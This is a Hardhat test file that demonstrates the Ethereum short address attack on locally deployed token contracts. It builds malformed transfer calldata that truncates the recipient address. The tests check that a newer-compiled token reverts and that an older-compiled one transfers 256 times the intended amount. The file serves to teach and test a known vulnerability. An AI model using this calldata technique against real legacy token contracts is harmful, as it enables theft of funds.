import { expect } from "chai";
import { network } from "hardhat";
import { parseEther, parseUnits } from "ethers";

const { ethers } = await network.connect();

/**
 * @title Short Address Attack Manual Test
 * @notice This test demonstrates the short address attack by manually constructing
 * malformed calldata, similar to the original run.ts script but in test format.
 */
describe("Short Address Attack - Manual Calldata Construction", function () {
  let newCompiledVulnToken: any;
  let oldCompiledVulnToken: any;
  let deployer: any;
  let recipient: any;

  async function createUsers(transferFrom: any, userCount: number) {
    const users = [];
    for (let i = 0; i < userCount; i++) {
      const user = ethers.Wallet.createRandom(ethers.provider);
      await transferFrom.sendTransaction({
        to: user.address,
        value: parseEther("100"),
      });
      users.push(user);
    }
    return users;
  }

  beforeEach(async function () {
    [deployer] = await ethers.getSigners();
    [recipient] = await createUsers(deployer, 1);

    // Deploy vulnerable contract
    const VulnFactory = await ethers.getContractFactory("NewCompiledVulnerableToken");
    newCompiledVulnToken = await VulnFactory.deploy();
    await newCompiledVulnToken.waitForDeployment();

    // Deploy fixed contract for comparison
    const attackFactory = await ethers.getContractFactory("OldCompiledVulnerableToken");
    oldCompiledVulnToken = await attackFactory.deploy();
    await oldCompiledVulnToken.waitForDeployment();

    // Mint some tokens to deployer
    const mintAmt = parseUnits("1000.0", 18); // 1000 tokens
    await newCompiledVulnToken.mint(deployer.address, mintAmt);
    await oldCompiledVulnToken.mint(deployer.address, mintAmt);
  });

  describe("Initial State", function () {
    it("Should have correct initial balances", async function () {
      const deployerBalance = await newCompiledVulnToken.balanceOf(deployer.address);
      const recipientBalance = await newCompiledVulnToken.balanceOf(recipient.address);

      expect(deployerBalance).to.equal(parseUnits("1000.0", 18));
      expect(recipientBalance).to.equal(0n);
    });
  });

  describe("Normal Transfer", function () {
    it("Should perform normal transfer correctly", async function () {
      const transferAmount = parseUnits("1.0", 18);
      const deployerBalanceBefore = await newCompiledVulnToken.balanceOf(deployer.address);
      const recipientBalanceBefore = await newCompiledVulnToken.balanceOf(recipient.address);

      await newCompiledVulnToken.transfer(recipient.address, transferAmount);

      const deployerBalanceAfter = await newCompiledVulnToken.balanceOf(deployer.address);
      const recipientBalanceAfter = await newCompiledVulnToken.balanceOf(recipient.address);

      expect(deployerBalanceAfter).to.equal(deployerBalanceBefore - transferAmount);
      expect(recipientBalanceAfter).to.equal(recipientBalanceBefore + transferAmount);
    });
  });

  describe("Short Address Attack - Malformed Calldata", function () {

    // Short address attack have been fixed in solidity compiler 5+, so this test should revert
    // it adopted 32 bytes alignment for address and amount, it will revert if the address is not 32 bytes aligned.
    it("NewCompiledVulnerableToken - Should revert", async function () {
      const transferAmount = parseUnits("1.0", 18);

      // Construct malformed calldata
      const iface = new ethers.Interface(["function transfer(address to,uint256 amount)"]);
      const selector = iface.getFunction("transfer")?.selector;

      const addrNo0x = recipient.address.slice(2);
      const shortAddrHex = addrNo0x.slice(0, addrNo0x.length - 2);
      const amt = transferAmount;
      const amtHex = amt.toString(16).padStart(64, "0");
      const sel = selector?.slice(2);
      const paddingStr = "0".repeat(24);
      const malformed = "0x" + sel + paddingStr + shortAddrHex + amtHex;

      // Send malformed transaction
      const tx = deployer.sendTransaction({
        to: await newCompiledVulnToken.getAddress(),
        data: malformed,
      });
      await expect(tx).to.be.revertedWithoutReason(ethers);
    });

    it("OldCompiledVulnerableToken - Should success and transfer tokens which is 256 times more than the expected amount", async function () {
      const transferAmount = parseUnits("1.0", 18);

      // Construct malformed calldata
      const iface = new ethers.Interface(["function transfer(address to,uint256 amount)"]);
      const selector = iface.getFunction("transfer")?.selector;

      const addrNo0x = recipient.address.slice(2);
      const shortAddrHex = addrNo0x.slice(0, addrNo0x.length - 2);
      const amt = transferAmount;
      const amtHex = amt.toString(16).padStart(64, "0");
      const sel = selector?.slice(2);
      const paddingStr = "0".repeat(24);
      const malformed = "0x" + sel + paddingStr + shortAddrHex + amtHex;
      // console.log("malformed data:", malformed);

      const deployerBalanceBefore = await oldCompiledVulnToken.balanceOf(deployer.address);
      // Send malformed transaction
      const tx = await deployer.sendTransaction({
        to: await oldCompiledVulnToken.getAddress(),
        data: malformed,
      });
      // await expect(tx).to.be.revertedWithoutReason(ethers);
      await tx.wait();
      const deployerBalanceAfter = await oldCompiledVulnToken.balanceOf(deployer.address);
      expect(deployerBalanceAfter).to.equal(deployerBalanceBefore - transferAmount * BigInt(256));
    });
  });

});

